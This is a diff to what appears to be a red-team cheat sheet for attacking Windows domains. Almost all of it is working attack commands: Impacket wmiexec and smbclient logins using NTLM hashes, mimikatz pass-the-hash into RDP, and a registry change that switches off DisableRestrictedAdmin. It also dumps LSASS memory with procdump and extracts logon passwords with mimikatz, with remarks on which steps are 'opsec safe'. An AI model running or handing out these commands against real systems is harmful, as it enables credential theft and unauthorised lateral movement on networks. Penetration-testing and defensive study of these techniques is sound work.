@@ -154,13 +154,25 @@ Use this when you cannot copy BloodHound.ps1 over to target.
 
 ### Impacket wmiexec.py (opsec safe - unless WMI logging is enabled)
 
-`wmiexec.py user@IP`
+`wmiexec.py domain/user@IP`
 
-`wmiexec.py user@IP -hashes ntlm:hash`
+`wmiexec.py domain/user@IP -hashes ntlm:hash`
 
 ### Impacket smbclient (probably opsec safe as its just using SMB)
 
 `python smbclient.py domain/blahuser@10.0.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:blah`
+
+## RDP Pass the Hash
+Using mimikatz:
+
+`privilege::debug`
+`sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"`
+
+If disabled:
+
+`sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe`
+`Enter-PSSession -Computer <Target>`
+`New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`
 
 ## Password dumping
 
@@ -180,7 +192,7 @@ Use this when you cannot copy BloodHound.ps1 over to target.
 `pwdump system sam`
 
 ### In Memory
-`C:\> procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1`
+`C:\> procdump.exe -accepteula -ma lsass.exe c:\lsass.dmp 2>&1`
 
 `C:\> mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit`
 
